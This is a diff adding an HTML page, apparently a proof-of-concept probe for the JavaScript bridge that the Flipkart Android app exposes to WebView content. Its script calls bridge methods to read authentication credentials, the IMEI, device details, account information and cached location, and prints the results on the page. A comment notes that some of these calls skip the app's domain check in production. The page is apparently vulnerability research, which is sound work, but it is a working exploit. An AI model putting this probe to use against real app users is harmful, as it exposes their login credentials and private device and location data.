@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flipkart Bridge Probe</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <h2>Bridge Probe Running...</h2>
+    <pre id="out">Waiting for Android bridge...</pre>
+    <script>
+        function log(name, data) {
+            var line = "\n[" + name + "]\n" + JSON.stringify(data, null, 2);
+            document.getElementById('out').innerText += line;
+        }
+        try {
+            // These bypass b() check in production (!FlipkartApplication.K)
+            var auth = Android.getAuthCredentials();
+            log("getAuthCredentials", auth);
+
+            var imei = Android.getIMEINumber();
+            log("getIMEINumber", imei);
+
+            var rooted = Android.isDeviceRooted();
+            log("isDeviceRooted", rooted);
+
+            var usb = Android.isUsbDebuggingEnabled();
+            log("isUsbDebuggingEnabled", usb);
+
+            var net = Android.getNetworkType();
+            log("getNetworkType", net);
+
+            var dev = Android.getDeviceDetails();
+            log("getDeviceDetails", dev);
+
+            var ver = Android.getAppVersion("com.flipkart.android");
+            log("getAppVersion", ver);
+
+            // These have b() check — might fail for external domain
+            try { log("getUserAccountInfo", Android.getUserAccountInformation()); } catch(e) { log("getUserAccountInfo", "BLOCKED"); }
+            try { log("getCachedLocation", Android.getCachedLocation()); } catch(e) { log("getCachedLocation", "BLOCKED"); }
+            try { log("getReferrer", Android.getReferrer()); } catch(e) { log("getReferrer", "BLOCKED"); }
+
+            document.getElementById('out').innerText += "\n\n=== DONE ===";
+
+        } catch(e) {
+            document.getElementById('out').innerText += "\nERROR: " + e;
+        }
+    </script>
+</body>
+</html>
